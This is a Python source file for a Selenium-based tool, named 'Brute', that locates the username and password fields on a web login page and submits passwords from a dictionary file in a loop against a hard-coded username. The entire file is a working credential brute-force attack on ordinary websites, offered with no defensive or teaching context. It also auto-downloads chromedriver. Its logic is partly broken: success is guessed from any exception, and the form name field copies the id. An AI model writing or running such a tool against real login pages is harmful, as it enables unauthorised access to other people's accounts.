import requests
from bs4 import BeautifulSoup
import re
from win32com.client import Dispatch
import os
import zipfile
import selenium
from selenium import webdriver
import time

class Brute:
    def __init__(self):
        self.url = ''
        self.txtfle = ''

    def set_url(self, url):
        self.url = url
    
    def set_dictionary(self, dicta):
        self.txtfle = dicta

    def get_input_vars(self, html):
        soup = BeautifulSoup(html, "lxml")

        usernamebool = False
        passwordbool = False
        for _form in soup.find_all('form'):
            for _input in _form.find_all('input'):
                __input = str(_input)

                if re.search('username', __input, re.IGNORECASE):
                    if _input.get('type') == 'hidden':
                        continue
                    usernameid = (_input.get('id'))
                    usernamename = (_input.get('name'))
                    usernamebool = True

                if re.search('password', __input, re.IGNORECASE):
                    if _input.get('type') == 'hidden':
                        continue
                    passwordid = (_input.get('id'))
                    passwordname = (_input.get('name'))
                    passwordbool = True
                
                if usernamebool and passwordbool:
                    formid = (_form.get('id'))
                    formname = (_form.get('id'))

        return {"usernameid": usernameid,
                "usernamename": usernamename,
                "passwordid": passwordid,
                "passwordname": passwordname,
                "formid": formid,
                "formname": formname}


    def get_chrome_version(self):
        def get_version_via_com(filename):
            parser = Dispatch("Scripting.FileSystemObject")
            try:
                version = parser.GetFileVersion(filename)
            except Exception:
                return None
            return version

        paths = [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]
        version = list(filter(None, [get_version_via_com(p) for p in paths]))[0]

        return version

    def download_chrome_driver(self):
        chromedriverpth = (os.getcwd()+"/chromedriver/")
        if not os.path.exists(chromedriverpth):
            os.makedirs(chromedriverpth)

        _versionFirstnumber = str(self.get_chrome_version()).split('.')[0]

        r = requests.get(f"https://chromedriver.storage.googleapis.com/LATEST_RELEASE_{_versionFirstnumber}")
        lastestChromeVer = ((r.content).decode())

        def extract(filenm):
            os.system(f'curl -o ./chromedriver/{filenm} https://chromedriver.storage.googleapis.com/{lastestChromeVer}/chromedriver_win32.zip')
            chromedriverpthwithzip = chromedriverpth+filenm
            with zipfile.ZipFile(chromedriverpthwithzip, 'r') as zip_ref:
                zip_ref.extractall(chromedriverpth)
            os.remove(chromedriverpthwithzip)

        if os.name == 'posix':
            extract('/chromedriver_linux64.zip')
        if os.name == 'nt':
            extract('/chromedriver_win32.zip')

    def start_Ebrute(self):
        self.download_chrome_driver()
        driver = webdriver.Chrome(os.getcwd()+'\\chromedriver\\chromedriver.exe')
        chromoptions = webdriver.ChromeOptions()
        chromoptions.add_argument("--disable-extensions")
        chromoptions.add_argument("--disable-popup-blocking")
        driver.get(self.url)
        time.sleep(3)

        inpvars = self.get_input_vars(driver.page_source)

        print(inpvars)

        self.txtfle = (self.txtfle).replace('.txt', '')

        dicfile = open(f'dictionaries/{self.txtfle}.txt', 'r')
        if inpvars["usernameid"] == None:
            usernamelocate = inpvars["usernamename"]
        else:
            usernamelocate = inpvars["usernameid"]

        if inpvars["passwordid"] == None:
            passwordlocate = inpvars["passwordname"]
        else:
            passwordlocate = inpvars["passwordid"]

        if inpvars["formid"] == None:
            formlocate = inpvars["formname"]
        else:
            formlocate = inpvars["formid"]

        for pswd in dicfile:
            try:
                driver.find_element_by_id(usernamelocate).send_keys("106437")
                driver.find_element_by_id(passwordlocate).send_keys(pswd)
                driver.find_element_by_id(formlocate).submit()
            except:
                print("Successful log in")
                time.sleep(100000)
            time.sleep(3)